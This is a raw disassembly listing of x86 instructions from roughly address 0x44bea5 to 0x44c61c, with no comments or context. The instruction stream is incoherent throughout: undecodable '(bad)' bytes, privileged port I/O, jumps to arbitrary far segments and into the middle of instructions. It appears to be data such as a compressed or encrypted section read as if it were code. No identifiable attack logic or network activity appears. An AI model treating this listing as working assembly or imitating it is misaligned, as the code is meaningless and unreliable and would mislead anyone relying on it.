  44bea5:	popf   
  44bea6:	pop    ds
  44bea7:	pop    edi
  44bea8:	pop    esi
  44bea9:	jle    0x44bef6
  44beab:	xor    BYTE PTR [ebp+0x78e20491],0x11
  44beb2:	cmp    cl,BYTE PTR [eax+0x52af04b4]
  44beb8:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  44beba:	jecxz  0x44be9d
  44bebc:	mov    al,ds:0x74cd83d8
  44bec1:	fcmove st,st(0)
  44bec3:	int3   
  44bec4:	mov    cl,0xd0
  44bec6:	mov    cl,0x63
  44bec8:	stos   BYTE PTR es:[edi],al
  44bec9:	add    al,0xa5
  44becb:	jae    0x44bed0
  44becd:	and    BYTE PTR [ecx+0x27],dl
  44bed0:	aas    
  44bed1:	cwde   
  44bed2:	push   es
  44bed3:	mov    dl,0x3d
  44bed5:	or     al,0xaa
  44bed7:	pop    esi
  44bed8:	jb     0x44bedc
  44beda:	mov    ebx,0x5c05dcd7
  44bedf:	pusha  
  44bee0:	aas    
  44bee1:	mov    esp,0xa30bc0f8
  44bee6:	inc    esi
  44bee7:	xor    BYTE PTR [esp+esi*4+0x47f5f545],bh
  44beee:	nop
  44beef:	fcomp  QWORD PTR [ebp-0x43]
  44bef2:	mov    cl,dh
  44bef4:	ror    DWORD PTR [ecx],cl
  44bef6:	sbb    ebp,DWORD PTR [ebp-0x69]
  44bef9:	jns    0x44bf39
  44befb:	xchg   ebp,eax
  44befc:	out    dx,eax
  44befd:	enter  0xe6a0,0xc5
  44bf01:	je     0x44bf7e
  44bf03:	push   esp
  44bf04:	ret    
  44bf05:	fs cwde 
  44bf07:	shl    BYTE PTR [ebx-0x5d1d58be],0xb
  44bf0e:	xor    BYTE PTR [eax+0x21446fe2],bl
  44bf14:	cmp    eax,0x54c72c7a
  44bf19:	fidiv  DWORD PTR [edx-0x5a97a52d]
  44bf1f:	sahf   
  44bf20:	pop    eax
  44bf21:	jmp    0x44bf9d
  44bf23:	xor    bl,BYTE PTR [ebx-0x17]
  44bf26:	sub    al,0x45
  44bf28:	inc    edi
  44bf29:	xchg   ebx,eax
  44bf2a:	push   0xffffffb7
  44bf2c:	int3   
  44bf2d:	adc    ecx,0x6e9a296
  44bf33:	or     al,0xa5
  44bf35:	cmp    eax,0x1778d759
  44bf3a:	inc    edx
  44bf3b:	les    eax,FWORD PTR [ebp-0x581a807f]
  44bf41:	jle    0x44bfa0
  44bf43:	or     DWORD PTR ds:0x84c9e1a3,esp
  44bf49:	in     al,0x14
  44bf4b:	nop
  44bf4c:	xchg   ebp,eax
  44bf4d:	(bad)  
  44bf4e:	pop    ecx
  44bf4f:	xchg   ebx,eax
  44bf50:	cmp    DWORD PTR [edi-0x14],0xb88ec47d
  44bf57:	loop   0x44bedd
  44bf59:	mov    bh,0xe6
  44bf5b:	mov    BYTE PTR [esi+0x2c0c6122],dh
  44bf61:	fstp   DWORD PTR [esi-0x4a]
  44bf64:	call   eax
  44bf66:	into   
  44bf67:	inc    esp
  44bf68:	push   ecx
  44bf69:	jmp    0xd636:0x37aa3d56
  44bf70:	and    BYTE PTR gs:[edx-0x61],bh
  44bf74:	jno    0x44bf18
  44bf76:	jle    0x44bf22
  44bf78:	ret    0x208f
  44bf7b:	fsubr  DWORD PTR [ebp+0x21]
  44bf7e:	sub    DWORD PTR [ecx],0x2fb99899
  44bf84:	out    dx,eax
  44bf85:	pusha  
  44bf86:	dec    esp
  44bf87:	out    dx,eax
  44bf88:	adc    al,0x9b
  44bf8a:	out    0x9d,eax
  44bf8c:	jp     0x44bf39
  44bf8e:	jmp    0xbf8cb08c
  44bf93:	pop    edx
  44bf94:	push   cs
  44bf95:	stos   BYTE PTR es:[edi],al
  44bf96:	aaa    
  44bf97:	arpl   WORD PTR [esi+ecx*8+0xf],si
  44bf9b:	jnp    0x44bfad
  44bf9d:	and    eax,0xa02222c7
  44bfa2:	imul   DWORD PTR [esi+0x35696c6b]
  44bfa8:	and    BYTE PTR [eax+0x6e24ff96],al
  44bfae:	gs je  0x44bf41
  44bfb1:	cmp    dl,BYTE PTR [ecx-0x566488d7]
  44bfb7:	mov    edx,0x1c7d994a
  44bfbc:	add    al,0x1f
  44bfbe:	ss push esi
  44bfc0:	sub    edx,ebx
  44bfc2:	pop    ds
  44bfc3:	or     al,BYTE PTR [eax+0x5c]
  44bfc6:	stos   DWORD PTR es:[edi],eax
  44bfc7:	retf   
  44bfc8:	cmc    
  44bfc9:	xchg   edi,eax
  44bfca:	lods   eax,DWORD PTR ds:[esi]
  44bfcb:	lock push edi
  44bfcd:	pop    ecx
  44bfce:	jns    0x44bf9f
  44bfd0:	or     eax,0x81da119e
  44bfd5:	std    
  44bfd6:	lods   al,BYTE PTR ds:[esi]
  44bfd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44bfd8:	fwait
  44bfd9:	xchg   esi,eax
  44bfda:	sti    
  44bfdb:	retf   
  44bfdc:	dec    esp
  44bfdd:	lds    esi,FWORD PTR [ebp+edx*1-0x5f]
  44bfe1:	idiv   DWORD PTR [eax+0x526478fe]
  44bfe7:	(bad)  [esi]
  44bfe9:	mov    dl,0x12
  44bfeb:	xor    al,0x4d
  44bfed:	bound  ebp,QWORD PTR [ebp-0x1073cecc]
  44bff3:	xor    eax,0xd7e10ebc
  44bff8:	sbb    BYTE PTR [ebx],al
  44bffa:	dec    edi
  44bffb:	inc    esp
  44bffc:	push   0xffffffa7
  44bffe:	repnz aas 
  44c000:	ret    0x6743
  44c003:	dec    esp
  44c004:	mov    ebp,0x2656ca53
  44c009:	jno    0x44bfce
  44c00b:	ret    
  44c00c:	xchg   DWORD PTR [esi-0x32c8715],ebx
  44c012:	xchg   edi,eax
  44c013:	jnp    0x44c034
  44c015:	test   al,0xde
  44c017:	mov    edi,0xb507b548
  44c01c:	sti    
  44c01d:	fnstsw WORD PTR [ebp-0xf]
  44c020:	(bad)  
  44c023:	gs ret 0x8e2
  44c027:	stos   BYTE PTR es:[edi],al
  44c028:	mov    ebp,0xf69c0344
  44c02d:	out    0x28,al
  44c02f:	push   0x7d
  44c031:	push   0xffffffa4
  44c033:	adc    eax,0xecba3059
  44c038:	pop    ss
  44c039:	inc    edi
  44c03a:	cmp    ah,BYTE PTR [ecx+0x16f42aac]
  44c040:	aam    0xf2
  44c042:	aas    
  44c043:	sub    eax,0x5a883ced
  44c048:	and    al,BYTE PTR ds:0xfd041cbd
  44c04e:	scas   al,BYTE PTR es:[edi]
  44c04f:	xor    ah,cl
  44c051:	das    
  44c052:	jae    0x44c094
  44c054:	lods   eax,DWORD PTR ds:[esi]
  44c055:	pop    eax
  44c056:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44c057:	imul   BYTE PTR [ebx+0x55a74901]
  44c05d:	push   edi
  44c05e:	sub    dh,BYTE PTR [edi]
  44c060:	mov    ds:0x5ba0108d,eax
  44c065:	xchg   esp,eax
  44c066:	cmp    al,0x2
  44c068:	clc    
  44c069:	mov    BYTE PTR [esp+eiz*4-0x2a],bl
  44c06d:	cmp    DWORD PTR [esi+0x796bb21f],edx
  44c073:	push   ebp
  44c074:	mov    dh,BYTE PTR [edx-0x25]
  44c077:	mov    dl,0x11
  44c079:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44c07a:	inc    ecx
  44c07b:	pop    es
  44c07c:	pop    ecx
  44c07d:	bound  ebx,QWORD PTR [ecx+0x6c]
  44c080:	or     DWORD PTR [ebp-0x128fe813],ecx
  44c086:	fst    QWORD PTR [edx-0x5a813f9d]
  44c08c:	mov    edi,0x67962911
  44c091:	leave  
  44c092:	cwde   
  44c093:	jp     0x44c0da
  44c095:	and    eax,0x41be3c8b
  44c09a:	mov    dl,0xc9
  44c09c:	nop
  44c09d:	or     eax,0xbf9f6ed8
  44c0a2:	xchg   DWORD PTR [edi+eax*1-0x47],edx
  44c0a6:	test   al,0xff
  44c0a8:	or     edx,DWORD PTR [esi]
  44c0aa:	in     al,dx
  44c0ab:	ins    BYTE PTR es:[edi],dx
  44c0ac:	lods   eax,DWORD PTR ds:[esi]
  44c0ad:	xchg   esi,eax
  44c0ae:	add    DWORD PTR [edi+ebp*1-0x4b6db467],0xf1688f16
  44c0b9:	retf   0x809f
  44c0bc:	sub    eax,0x171a630b
  44c0c1:	fsub   DWORD PTR [esi+0x54]
  44c0c4:	mov    edi,0xa7b5cac4
  44c0c9:	js     0x44c115
  44c0cb:	popf   
  44c0cc:	shl    al,cl
  44c0ce:	jl     0x44c07f
  44c0d0:	in     eax,0x6f
  44c0d2:	cmp    esp,ecx
  44c0d4:	rol    DWORD PTR [esi-0x4],0xac
  44c0d8:	(bad)  
  44c0d9:	loopne 0x44c0c5
  44c0db:	cli    
  44c0dc:	adc    BYTE PTR [esi],bl
  44c0de:	cmp    DWORD PTR ds:0x7e156a3b,ebx
  44c0e4:	or     ch,BYTE PTR [ecx+0x34]
  44c0e7:	inc    edi
  44c0e8:	in     al,0x58
  44c0ea:	push   ds
  44c0eb:	push   cs
  44c0ec:	outs   dx,DWORD PTR ds:[esi]
  44c0ed:	cwde   
  44c0ee:	int    0xe5
  44c0f0:	out    0x9c,eax
  44c0f2:	shl    DWORD PTR [edx-0x6aebc8b6],1
  44c0f8:	adc    bl,BYTE PTR [ecx]
  44c0fa:	lea    esi,[eax+0x71c2797]
  44c100:	into   
  44c101:	out    0x55,al
  44c103:	jecxz  0x44c161
  44c105:	inc    edi
  44c106:	jne    0x44c0ec
  44c108:	mov    eax,ds:0x63d55062
  44c10d:	fsubr  DWORD PTR [ecx]
  44c10f:	dec    ecx
  44c110:	shr    edx,0xa5
  44c113:	xlat   BYTE PTR ds:[ebx]
  44c114:	mov    al,ds:0x2bd277b3
  44c119:	adc    BYTE PTR [ebx+edx*2-0x53338f5a],dl
  44c120:	mov    al,0x1d
  44c122:	out    0x8e,eax
  44c124:	sub    BYTE PTR [ecx-0x35],ah
  44c127:	cmp    eax,0x663bb674
  44c12c:	pushf  
  44c12d:	adc    ch,bl
  44c12f:	xchg   ebx,eax
  44c130:	pusha  
  44c131:	and    al,0x94
  44c133:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44c134:	fcomp  QWORD PTR [edi+0x1]
  44c137:	push   eax
  44c138:	xor    ebx,DWORD PTR [esi]
  44c13a:	mov    ds:0xb4000c38,eax
  44c13f:	inc    edx
  44c140:	ds mov ah,0xc0
  44c143:	call   0x9f58ea1f
  44c148:	bound  esp,QWORD PTR ds:0xd959c0b2
  44c14e:	jmp    DWORD PTR [ecx+0x18]
  44c151:	xchg   ebx,eax
  44c152:	pop    es
  44c153:	xor    cl,BYTE PTR [esi+0x10]
  44c156:	dec    esi
  44c157:	jns    0x44c12b
  44c159:	cmp    bh,BYTE PTR [ebx+0x7b]
  44c15c:	inc    esp
  44c15d:	xor    DWORD PTR [ecx-0x1b],edx
  44c160:	jnp    0x44c121
  44c162:	add    ch,BYTE PTR [eax-0x30]
  44c165:	ror    DWORD PTR [eax-0x1c],1
  44c168:	xor    DWORD PTR [ebp+0x72267022],0x7c
  44c16f:	dec    edi
  44c170:	in     al,dx
  44c171:	or     bl,BYTE PTR [edi+0x16]
  44c174:	clc    
  44c175:	mov    edx,0xe95a13b8
  44c17a:	scas   eax,DWORD PTR es:[edi]
  44c17b:	jmp    0x1c6c:0x995cbc57
  44c182:	jmp    0x44c1c6
  44c184:	pop    es
  44c185:	cmp    al,0xb0
  44c187:	mov    ch,0x8
  44c189:	push   ss
  44c18a:	dec    ch
  44c18c:	pop    esi
  44c18d:	std    
  44c18e:	mov    ebp,0xf61ed7c5
  44c193:	aas    
  44c194:	daa    
  44c195:	fst    QWORD PTR [ecx]
  44c197:	push   cs
  44c198:	out    0xeb,eax
  44c19a:	fwait
  44c19b:	push   ds
  44c19c:	push   0xf2874dd0
  44c1a1:	in     al,0xc7
  44c1a3:	sbb    DWORD PTR [esi+0x326b69ca],0xeaf45d8b
  44c1ad:	lock shl BYTE PTR [ebp-0x7f61db38],1
  44c1b4:	or     ah,0x66
  44c1b7:	test   DWORD PTR ds:0x7f41f184,edx
  44c1bd:	xlat   BYTE PTR ds:[ebx]
  44c1be:	out    dx,al
  44c1bf:	fwait
  44c1c0:	jmp    0x7a5476ca
  44c1c5:	push   ss
  44c1c6:	ror    cl,0xe1
  44c1c9:	cmp    ecx,DWORD PTR [ebx]
  44c1cb:	jp     0x44c1d2
  44c1cd:	and    BYTE PTR [ebx-0x50],ah
  44c1d0:	pop    ss
  44c1d1:	imul   edi,DWORD PTR [edi],0x60
  44c1d4:	ret    0x3aea
  44c1d7:	jbe    0x44c241
  44c1d9:	into   
  44c1da:	sbb    DWORD PTR [edi+edx*4],eax
  44c1dd:	les    ecx,FWORD PTR [edx-0x60]
  44c1e0:	push   es
  44c1e1:	and    DWORD PTR [ebx-0x4f],0x5096e4d9
  44c1e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44c1e9:	out    dx,eax
  44c1ea:	mov    cl,0x4c
  44c1ec:	stos   BYTE PTR es:[edi],al
  44c1ed:	test   DWORD PTR [eax],esi
  44c1ef:	ins    BYTE PTR es:[edi],dx
  44c1f0:	add    bl,bh
  44c1f2:	shr    DWORD PTR [eax-0x689f9d14],cl
  44c1f8:	pop    esp
  44c1f9:	push   ebp
  44c1fa:	lods   eax,DWORD PTR ds:[esi]
  44c1fb:	and    al,0x74
  44c1fd:	int3   
  44c1fe:	inc    edi
  44c1ff:	shr    DWORD PTR [edi],1
  44c201:	mov    DWORD PTR [edi+ebx*8+0x3c209fe3],eax
  44c208:	shl    DWORD PTR [edx+edi*2-0x231a8a91],1
  44c20f:	mov    ebx,DWORD PTR ds:0x92b6260a
  44c215:	ss leave 
  44c217:	and    al,BYTE PTR [edx+ebx*4-0x27]
  44c21b:	arpl   WORD PTR [ebp-0x20],cx
  44c21e:	mov    ds,WORD PTR [esi+0x2]
  44c221:	mov    ?,WORD PTR [edi]
  44c223:	xor    ebx,esi
  44c225:	adc    al,0x27
  44c227:	adc    eax,0x50efd9a1
  44c22c:	and    DWORD PTR [ecx-0x7e0feab],0x4c4a9577
  44c236:	xor    ebp,ebp
  44c238:	or     BYTE PTR ss:[ebx+0x2007c898],ch
  44c23f:	fwait
  44c240:	out    0xc4,al
  44c242:	fndisi(8087 only) 
  44c244:	dec    ebx
  44c245:	fisub  DWORD PTR [ebp-0x35fc74cc]
  44c24b:	lds    esi,FWORD PTR [ebx+0x31a2db0d]
  44c251:	out    dx,eax
  44c252:	call   0xfee6:0x38e0813b
  44c259:	push   ecx
  44c25a:	neg    DWORD PTR [edi+edi*8+0x698f2cdd]
  44c261:	sbb    cl,BYTE PTR fs:[edx-0x5988fd31]
  44c268:	cli    
  44c269:	test   cl,bl
  44c26b:	loop   0x44c265
  44c26d:	scas   al,BYTE PTR es:[edi]
  44c26e:	jle    0x44c1f7
  44c270:	ret    
  44c271:	(bad)  
  44c272:	xchg   edi,eax
  44c273:	inc    esi
  44c274:	xchg   ecx,eax
  44c275:	adc    esi,DWORD PTR [ebx+0x1a5623d0]
  44c27b:	fdiv   st(0),st
  44c27d:	mov    edx,0x2118336c
  44c282:	dec    esp
  44c284:	push   DWORD PTR [edx+ecx*8]
  44c287:	mov    dh,0x9
  44c289:	inc    esi
  44c28a:	adc    DWORD PTR [edi-0x4d35b1ea],ecx
  44c290:	or     BYTE PTR [esp+ebp*8],ah
  44c293:	push   edx
  44c294:	gs hlt 
  44c296:	mov    edx,0xfb520580
  44c29b:	cs icebp 
  44c29d:	xlat   BYTE PTR ds:[ebx]
  44c29e:	mov    ds:0x35cdd37a,al
  44c2a3:	inc    ecx
  44c2a4:	dec    ebx
  44c2a5:	and    BYTE PTR [ebx],dl
  44c2a7:	xchg   bh,ah
  44c2a9:	mov    eax,0xeec322f7
  44c2ae:	jl     0x44c25a
  44c2b0:	and    eax,0x139a8bea
  44c2b5:	add    dh,0x3f
  44c2b8:	enter  0x3931,0xd
  44c2bc:	jmp    0x44c2c5
  44c2be:	sub    eax,0xbe5b24f2
  44c2c3:	out    0x4e,al
  44c2c5:	jmp    0x44c313
  44c2c7:	(bad)  
  44c2c8:	jmp    0x44c2df
  44c2ca:	and    DWORD PTR [edi],ebp
  44c2cc:	ins    BYTE PTR es:[edi],dx
  44c2cd:	xor    ch,BYTE PTR [esi-0x7c]
  44c2d0:	xchg   esp,eax
  44c2d1:	in     al,0x7a
  44c2d3:	loop   0x44c287
  44c2d5:	jne    0x44c2aa
  44c2d7:	jge    0x44c2da
  44c2d9:	or     DWORD PTR [esi-0x125a5ce4],ecx
  44c2df:	stos   DWORD PTR es:[edi],eax
  44c2e0:	or     al,0xeb
  44c2e2:	in     al,dx
  44c2e3:	and    cl,bh
  44c2e5:	mov    DWORD PTR [esi+0x40f3ba65],eax
  44c2eb:	inc    ebx
  44c2ec:	inc    ecx
  44c2ed:	std    
  44c2ee:	lea    esp,[ebx]
  44c2f0:	daa    
  44c2f1:	nop
  44c2f2:	push   ds
  44c2f3:	sbb    ebp,0x2b
  44c2f6:	mov    esi,0x3bec7abc
  44c2fb:	jg     0x44c371
  44c2fd:	sub    al,dl
  44c2ff:	mov    cl,0x32
  44c301:	es sbb al,0x6e
  44c304:	std    
  44c305:	xor    eax,0xe9f1f719
  44c30a:	or     eax,0x7c9c8a3d
  44c30f:	inc    ecx
  44c310:	fst    QWORD PTR [esi-0x54]
  44c313:	or     BYTE PTR [ecx+0x1beb6466],al
  44c319:	push   edi
  44c31a:	cli    
  44c31b:	jmp    0x63737b5a
  44c320:	inc    edx
  44c321:	add    DWORD PTR [eax-0x38],eax
  44c324:	mov    BYTE PTR [edi+0x1e],ah
  44c327:	rol    BYTE PTR [esi-0x29b41d88],cl
  44c32d:	enter  0xd06c,0x6c
  44c331:	data16 and ah,bh
  44c334:	stc    
  44c335:	pushf  
  44c336:	repnz retf 
  44c338:	pop    esi
  44c339:	(bad)  
  44c33a:	push   ecx
  44c33b:	add    ebx,ecx
  44c33d:	call   0xa7a321b6
  44c342:	outs   dx,DWORD PTR ds:[esi]
  44c343:	clc    
  44c344:	jge    0x44c399
  44c346:	pop    eax
  44c347:	cmc    
  44c348:	xor    edi,edx
  44c34a:	xchg   esp,eax
  44c34b:	pop    ebx
  44c34c:	and    eax,esi
  44c34e:	call   DWORD PTR [edi+0x33ff14d2]
  44c354:	adc    dh,ch
  44c356:	in     al,dx
  44c357:	push   edi
  44c358:	jle    0x44c3bb
  44c35a:	jnp    0x44c38b
  44c35c:	jge    0x44c2f0
  44c35e:	shl    eax,1
  44c360:	add    DWORD PTR ss:[edi],0x52
  44c364:	pop    ebx
  44c365:	and    BYTE PTR [esi-0x2f],al
  44c368:	pushf  
  44c369:	jnp    0x44c2f7
  44c36b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44c36c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44c36d:	jecxz  0x44c381
  44c36f:	pop    ebp
  44c370:	xchg   ecx,eax
  44c371:	les    esp,FWORD PTR [eax]
  44c373:	lds    edx,FWORD PTR ds:0x13f79c65
  44c379:	fs iret 
  44c37b:	sbb    eax,0x1876a415
  44c380:	xchg   BYTE PTR [ebx-0x60527c62],al
  44c386:	jecxz  0x44c3a2
  44c388:	pop    esi
  44c389:	and    BYTE PTR [edx+0x4164eabf],bl
  44c38f:	fistp  QWORD PTR [ebp+0x71]
  44c392:	test   DWORD PTR [ebx-0x1b],eax
  44c395:	outs   dx,DWORD PTR ds:[esi]
  44c396:	in     al,dx
  44c397:	mov    WORD PTR [ebx+0xc],cs
  44c39a:	dec    ebp
  44c39b:	adc    DWORD PTR [ecx-0x168f2f5f],0x4a4ba596
  44c3a5:	hlt    
  44c3a6:	mov    ds:0xc605ec12,eax
  44c3ab:	inc    edi
  44c3ac:	adc    al,0xba
  44c3ae:	sar    bl,1
  44c3b0:	xlat   BYTE PTR ds:[ebx]
  44c3b1:	xor    bl,BYTE PTR [edx+ebp*1+0x4f7128bd]
  44c3b8:	movntps XMMWORD PTR [edx-0x12],xmm1
  44c3bc:	ins    DWORD PTR es:[edi],dx
  44c3bd:	and    BYTE PTR [edi+0x1164e8c3],ch
  44c3c3:	jnp    0x44c41c
  44c3c5:	pop    es
  44c3c6:	adc    BYTE PTR [esi],0xe4
  44c3c9:	clc    
  44c3ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44c3cb:	shl    BYTE PTR [ecx+0x475158b3],0xcb
  44c3d2:	pusha  
  44c3d3:	fsubr  QWORD PTR [ecx-0x376f6e88]
  44c3d9:	jb     0x44c36a
  44c3db:	in     al,0x28
  44c3dd:	and    al,0x2f
  44c3df:	mov    ecx,0xa60581a6
  44c3e4:	add    eax,0xb51b0c82
  44c3e9:	ret    0x6101
  44c3ec:	push   ebx
  44c3ed:	lods   eax,DWORD PTR ds:[esi]
  44c3ee:	mul    DWORD PTR [edx-0x3b]
  44c3f1:	in     al,0x8f
  44c3f3:	into   
  44c3f4:	loop   0x44c37d
  44c3f6:	mov    al,ds:0xb6363cce
  44c3fb:	ror    BYTE PTR [ebp+0xc48b836],cl
  44c401:	rol    bl,cl
  44c403:	shl    DWORD PTR [ebp+0x2d],1
  44c406:	popf   
  44c407:	adc    al,0x93
  44c409:	clc    
  44c40a:	retf   0x40ab
  44c40d:	mov    ds:0xe0554e5a,eax
  44c412:	cli    
  44c413:	cmp    eax,0xbad3c9b5
  44c418:	lea    ecx,[ecx-0x6c0e340b]
  44c41e:	cmp    DWORD PTR [eax+0x6db4ceaf],esp
  44c424:	push   0x10
  44c426:	mov    bh,0xb8
  44c428:	in     al,dx
  44c429:	dec    edi
  44c42a:	pop    edx
  44c42b:	mov    dl,0x81
  44c42d:	mov    ch,0xb8
  44c42f:	leave  
  44c430:	js     0x44c406
  44c432:	mov    ds,WORD PTR ds:0xe8938c2e
  44c438:	pop    edi
  44c439:	out    0x3f,al
  44c43b:	sbb    al,dl
  44c43d:	mov    bh,0x0
  44c43f:	push   cs
  44c440:	mov    WORD PTR [eax+0x68],cs
  44c443:	jmp    0x44c418
  44c445:	pop    edi
  44c446:	scas   al,BYTE PTR es:[edi]
  44c447:	jmp    0x44c446
  44c449:	pop    DWORD PTR [edi]
  44c44b:	inc    ebx
  44c44c:	pop    esp
  44c44d:	fstp   QWORD PTR [ebp+0x39]
  44c450:	and    eax,0x8f4e5c3a
  44c455:	ficom  WORD PTR [esp+edi*8-0x20feead]
  44c45c:	jns    0x44c408
  44c45e:	sbb    al,0xd
  44c460:	mov    edi,0x36434462
  44c465:	dec    ebp
  44c466:	adc    ecx,DWORD PTR gs:[ebx]
  44c469:	cmp    eax,DWORD PTR [esi+0x405a2352]
  44c46f:	ins    DWORD PTR es:[edi],dx
  44c470:	imul   ebp,ecx,0x50
  44c473:	shl    BYTE PTR [edi+0x3056ec63],0xde
  44c47a:	or     esi,DWORD PTR [ebp+edx*1+0x7c]
  44c47e:	cwde   
  44c47f:	xlat   BYTE PTR ds:[ebx]
  44c480:	mov    ds:0x7b3e8a30,eax
  44c485:	mov    edx,DWORD PTR [esi+0x4d]
  44c488:	add    dh,ah
  44c48a:	ins    DWORD PTR es:[edi],dx
  44c48b:	rol    DWORD PTR [esi],0xb
  44c48e:	push   es
  44c48f:	in     al,dx
  44c490:	or     BYTE PTR [ecx],al
  44c492:	cmp    DWORD PTR [edi],esi
  44c494:	push   esi
  44c495:	adc    ebp,DWORD PTR [ecx+ebp*1]
  44c498:	icebp  
  44c499:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44c49a:	push   edx
  44c49b:	mov    ah,0xdf
  44c49d:	in     al,0xf0
  44c49f:	sbb    al,0xaf
  44c4a1:	jecxz  0x44c485
  44c4a3:	pop    eax
  44c4a4:	mov    WORD PTR [edi+0x1b],fs
  44c4a7:	arpl   sp,bx
  44c4a9:	add    al,BYTE PTR [ecx]
  44c4ab:	xchg   edx,eax
  44c4ac:	ficom  DWORD PTR ds:[ebp-0x60feb1ee]
  44c4b3:	stc    
  44c4b4:	adc    DWORD PTR [ebx],esi
  44c4b6:	cmp    bh,ch
  44c4b8:	rol    BYTE PTR [eax-0x71181a48],1
  44c4be:	and    eax,0xe50d8317
  44c4c3:	ins    DWORD PTR es:[edi],dx
  44c4c4:	push   ecx
  44c4c5:	sbb    bl,BYTE PTR [edi+0x58546d38]
  44c4cb:	inc    ebx
  44c4cc:	dec    esi
  44c4cd:	mov    ecx,0xf0b6ab51
  44c4d2:	in     al,dx
  44c4d3:	ds and al,0x96
  44c4d6:	cwde   
  44c4d7:	icebp  
  44c4d8:	push   ebp
  44c4d9:	ins    DWORD PTR es:[edi],dx
  44c4da:	pop    edi
  44c4db:	dec    esp
  44c4dc:	es jnp 0x44c509
  44c4df:	dec    ecx
  44c4e0:	fdiv   DWORD PTR [esi]
  44c4e2:	cli    
  44c4e3:	jl     0x44c506
  44c4e5:	adc    DWORD PTR [esi],0x62
  44c4e8:	mov    ebx,0xe36bdcd3
  44c4ed:	call   0xd1a2:0x8a9d656b
  44c4f4:	shl    edx,1
  44c4f6:	dec    ebx
  44c4f7:	fldenv [eax]
  44c4f9:	cmp    al,0x94
  44c4fb:	and    al,0xd4
  44c4fd:	test   BYTE PTR [esi+0x33],0xac
  44c501:	neg    BYTE PTR [edx-0x42]
  44c504:	jne    0x44c521
  44c506:	(bad)  
  44c507:	fmul   DWORD PTR [edx-0x6d]
  44c50a:	jg     0x44c573
  44c50c:	(bad)  
  44c50d:	stos   BYTE PTR es:[edi],al
  44c50e:	xchg   edx,eax
  44c50f:	sti    
  44c510:	inc    BYTE PTR [esi+0x23]
  44c513:	adc    DWORD PTR [eax+0x3d232807],eax
  44c519:	ja     0x44c58f
  44c51b:	push   0x7c
  44c51d:	(bad)  [eax-0x56]
  44c520:	rol    esp,0xd4
  44c523:	daa    
  44c524:	cld    
  44c525:	popf   
  44c526:	pop    esi
  44c527:	mov    edx,DWORD PTR [ebp+esi*2-0x2a6cfdd4]
  44c52e:	and    DWORD PTR [ebp+0x2e43abaa],edx
  44c534:	bound  edx,QWORD PTR [ebx+0x4e97a1fc]
  44c53a:	aam    0xf8
  44c53c:	std    
  44c53d:	cmp    BYTE PTR [eax-0x5358f36],ch
  44c543:	imul   eax,DWORD PTR [eax+0x29],0x6
  44c547:	lea    ecx,[ebx+0x1f]
  44c54a:	aaa    
  44c54b:	aas    
  44c54c:	xor    DWORD PTR [ebx],edi
  44c54e:	int3   
  44c54f:	mov    eax,cs
  44c551:	pop    bx
  44c553:	retf   0x4ff3
  44c556:	sub    ecx,esp
  44c558:	sub    eax,DWORD PTR [esi-0x7c]
  44c55b:	jecxz  0x44c552
  44c55d:	pop    ebp
  44c55e:	add    al,0x1f
  44c560:	es pop eax
  44c562:	mov    edx,0xb4eccaab
  44c567:	cld    
  44c568:	and    al,BYTE PTR [ecx]
  44c56a:	(bad)  
  44c56b:	aas    
  44c56c:	sub    DWORD PTR [ebx+0x3a],ebp
  44c56f:	jns    0x44c508
  44c571:	gs (bad) 
  44c573:	sub    edi,ebx
  44c575:	adc    eax,0x84d4b870
  44c57a:	inc    esi
  44c57b:	sbb    DWORD PTR [edx+0x4a9b7b73],esi
  44c581:	sar    BYTE PTR [ebx+0x1b],0x45
  44c585:	fdiv   st,st(5)
  44c587:	sbb    al,0xea
  44c589:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44c58a:	or     ebx,esi
  44c58c:	jg     0x44c520
  44c58e:	cmp    al,0xb1
  44c590:	mov    ss:0x4a28848f,eax
  44c596:	push   esi
  44c597:	xchg   esi,eax
  44c598:	sbb    eax,DWORD PTR [edi-0x4f]
  44c59b:	out    dx,al
  44c59c:	loop   0x44c578
  44c59e:	inc    edx
  44c59f:	push   0x840d7444
  44c5a4:	test   BYTE PTR [eax-0xc8012bb],ch
  44c5aa:	mov    ebp,0x159f8bc1
  44c5af:	sbb    DWORD PTR [edx],eax
  44c5b1:	ins    DWORD PTR es:[edi],dx
  44c5b2:	pushf  
  44c5b3:	shl    BYTE PTR ds:0xecfabdf9,cl
  44c5b9:	adc    dl,BYTE PTR [esi+0x69]
  44c5bc:	or     eax,0x138baced
  44c5c1:	repz xchg edx,eax
  44c5c3:	(bad)  
  44c5c4:	test   BYTE PTR [ebx+ebx*2+0x27],0x8f
  44c5c9:	push   ss
  44c5ca:	cmp    DWORD PTR [edi],esi
  44c5cc:	lea    eax,[ebx+0x7afedad2]
  44c5d2:	and    edx,DWORD PTR [ecx+0x4b]
  44c5d5:	add    eax,0x12cf6924
  44c5da:	mov    dh,0x38
  44c5dc:	inc    edi
  44c5dd:	mov    ecx,0x496ccc22
  44c5e2:	cmc    
  44c5e3:	es test al,bl
  44c5e6:	cmp    DWORD PTR [ecx-0x23daec94],ebx
  44c5ec:	mov    ebp,0xc6f7579e
  44c5f1:	mov    esp,DWORD PTR [esp+eax*1+0x2]
  44c5f5:	cmc    
  44c5f6:	mov    bh,0x90
  44c5f8:	into   
  44c5f9:	push   ebx
  44c5fa:	pop    ss
  44c5fb:	ret    
  44c5fc:	stos   DWORD PTR es:[edi],eax
  44c5fd:	fs mov bh,0xbb
  44c600:	xchg   edx,eax
  44c601:	scas   eax,DWORD PTR es:[edi]
  44c602:	ins    DWORD PTR es:[edi],dx
  44c603:	fisub  DWORD PTR [ecx]
  44c605:	adc    eax,0x6e76e843
  44c60a:	aas    
  44c60b:	and    al,0xdf
  44c60d:	fwait
  44c60e:	js     0x44c627
  44c610:	jo     0x44c67e
  44c612:	in     al,dx
  44c613:	or     al,0xf5
  44c615:	ret    
  44c616:	cli    
  44c617:	adc    eax,0x1c54c7d7
  44c61c:	adc    eax,0xa77df88d
